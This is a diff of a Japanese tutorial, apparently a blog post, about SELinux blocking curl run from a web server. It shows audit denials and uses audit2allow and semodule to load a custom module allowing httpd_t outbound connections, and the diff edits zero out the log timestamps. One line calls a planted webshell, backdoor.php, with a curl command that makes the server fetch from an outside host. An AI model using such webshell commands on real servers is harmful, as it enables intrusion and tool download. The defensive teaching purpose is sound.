@@ -55,7 +55,7 @@ PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
 サーバ側で audit ログを確認すると、SELinux で curl コマンドが拒否されたことが確認できます。
 ~~~bash
 ~]# tail -f /var/log/audit/audit.log | grep denied
-type=AVC msg=audit(1634698402.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
+type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
 ~~~
 攻撃者は curl を使って、攻撃者が用意したサイトから権限昇格を実行するためのツールなどを取得させるので、今回はSELinuxでcurlを使ったツールダウンロードを防ぐことができました。
 
@@ -117,7 +117,7 @@ Last Seen                     2021-10-20 14:19:44 JST
 Local ID                      ccddc712-ce2a-4215-a99f-8b4c37d9e9bb
 
 Raw Audit Messages
-type=AVC msg=audit(1634707184.461:493): avc:  denied  { name_connect } for  pid=4431 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
+type=AVC msg=audit(0000000000.461:493): avc:  denied  { name_connect } for  pid=4431 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
 ~~~
 
 例外ルールの追加方法は2つあります。
@@ -136,7 +136,7 @@ allow this access for now by executing:
 抽出したauditログ(SELinuxによる拒否ログ)を audit2allow コマンドに入力することで、SELinuxで許可するためのポリシーモジュールを生成してくれます。
 出力結果では、タイプ httpd_t が http_port_t:tcp_socket (TCPのソケットを開く権限) を許可していることがわかります。
 ~~~bash
-~]# echo 'type=AVC msg=audit(1634698402.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow
+~]# echo 'type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow
 
 #============= httpd_t ==============
 
@@ -147,7 +147,7 @@ allow httpd_t http_port_t:tcp_socket name_connect;
 カスタムポリシーモジュールとして良さそうなので、my-curl というファイル名で保存します。
 保存したカスタムポリシーモジュールを優先度300でSELinuxに登録して、システムポリシーモジュールの一覧に登録されたことを確認します。
 ~~~bash
-~]# echo 'type=AVC msg=audit(1634698402.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow -M my-curl
+~]# echo 'type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow -M my-curl
 ~]# semodule -X 300 -i my-curl.pp
 ~]# semodule --list-modules=full | grep my-curl -3
 300 my-curl           pp
